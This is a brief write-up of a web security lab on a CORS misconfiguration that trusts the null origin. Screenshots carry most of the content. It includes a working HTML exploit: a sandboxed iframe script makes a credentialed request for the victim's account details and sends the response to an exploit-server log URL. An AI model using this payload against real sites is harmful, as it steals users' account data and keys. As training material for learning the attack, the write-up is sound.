# Lab: CORS vulnerability with trusted null origin

## Lab Description

![image](https://github.com/KVNuhman/Web-Security-Lab/assets/46161259/0b051784-8eb8-4bd0-8204-ba326489a426)

## Solution

![image](https://github.com/KVNuhman/Web-Security-Lab/assets/46161259/bfb2632c-0b16-4fef-b5aa-9a71ffdf3f3d)
![image](https://github.com/KVNuhman/Web-Security-Lab/assets/46161259/261496e2-a890-4581-81db-aacb6209612c)
![image](https://github.com/KVNuhman/Web-Security-Lab/assets/46161259/80d8b0c1-0ec9-47f5-ae96-64403b6e0d2d)
![image](https://github.com/KVNuhman/Web-Security-Lab/assets/46161259/4420bda9-9c0b-4bb5-984f-a49fe23afce2)

```HTML
<iframe sandbox="allow-scripts allow-top-navigation allow-forms" srcdoc="<script>
    var req = new XMLHttpRequest();
    req.onload = reqListener;
    req.open('get','YOUR-LAB-ID.web-security-academy.net/accountDetails',true);
    req.withCredentials = true;
    req.send();
    function reqListener() {
        location='YOUR-EXPLOIT-SERVER-ID.exploit-server.net/log?key='+encodeURIComponent(this.responseText);
    };
</script>"></iframe>
```

![image](https://github.com/KVNuhman/Web-Security-Lab/assets/46161259/d12b68f1-31d7-4c29-85eb-9c2901f2181e)
